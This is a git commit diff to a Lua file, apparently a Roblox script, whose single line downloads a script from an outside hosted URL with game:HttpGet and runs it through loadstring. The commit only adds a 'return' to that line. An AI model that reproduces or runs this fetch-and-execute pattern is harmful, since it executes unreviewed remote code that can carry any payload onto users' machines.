102a060d8e1eb53297b017ad9bf75f6da80ac139
XK5NG <166706090+XK5NG@users.noreply.github.com>
2026-03-11 00:38:31 +0800

    Update XK5NG_Handler.lua

--- XK5NG_Handler.lua
+++ XK5NG_Handler.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/54d332ba42c72bd4b952aa751ac6feaff929e40ac4488a62afe9741d9f531c90.lua"))()
+return loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/54d332ba42c72bd4b952aa751ac6feaff929e40ac4488a62afe9741d9f531c90.lua"))()
